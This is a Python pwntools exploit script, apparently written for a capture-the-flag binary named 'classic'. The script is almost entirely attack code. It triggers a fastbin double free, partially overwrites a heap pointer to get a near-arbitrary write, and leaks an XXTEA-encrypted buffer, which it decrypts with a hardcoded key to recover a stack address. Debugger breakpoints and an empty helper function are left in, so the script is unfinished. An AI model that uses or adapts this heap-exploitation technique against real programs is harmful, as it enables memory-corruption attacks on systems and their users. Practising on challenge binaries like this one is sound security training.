from pwn import *
from ctypes import *
context(arch='amd64',os='linux',log_level='debug')

sl = lambda x:io.sendline(x)
s = lambda x:io.send(x)
rn = lambda x:io.recv(x)
ru = lambda x:io.recvuntil(x, drop=True)
r = lambda :io.recv()
it = lambda: io.interactive()
success = lambda x, y:log.success(x + ' '+ hex(y))

binary = './classic'

io = process(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

xxtea = cdll.LoadLibrary("./xxtea.so")

def xxtea_decrypt(v, n, k):
    xxtea.btea()


def add(size, c, d):
    s('\x01')
    sleep(0.1)
    s(c)
    sl(str(size))
    s(d)

def dele(idx):
    s('\x02')
    sl(str(idx))

ru('\n')
add(0xa0, p64(0), 'a')
add(0x80, p64(0), 'a')
add(0x60, p64(0), 'a')
dele(0)
add(0x60, p64(0), 'a')
dele(3)
dele(2)
dele(3)
add(0x60, p64(0), '\x10')
add(0x60, p64(0), 'a')
add(0x60, p64(0), 'a')
dele(1)
add(0x60, p64(0), p64(0x71)+'\xed\x7a')
gdb.attach(io)
raw_input()

add(0x60, p64(0), p64(0)+p64(0x81)+'aaa')


add(0x40, p64(0), '\x00')
s('\x03')
s('a'*32)
data = rn(44)
int_arr4 = c_uint*4
key = int_arr4()
key[0] = c_uint(0x6854CC6D)
key[1] = c_uint(0x0A4BB7D0E)
key[2] = c_uint(0x660B8F8F)
key[3] = c_uint(0x714829A5)
int_arr44 = c_ubyte*44
d = int_arr44()
for i in range(44):
    d[i] = c_ubyte(ord(data[i]))
xxtea.btea(d, -0xb, key)
secret = ''.join(list(chr(i) for i in d))
print secret
stack_address = u64(secret[0x20:0x28])
success('stack address', stack_address)
dele(0)
gdb.attach(io,'b *$rebase(0xdb2)')
raw_input()
it()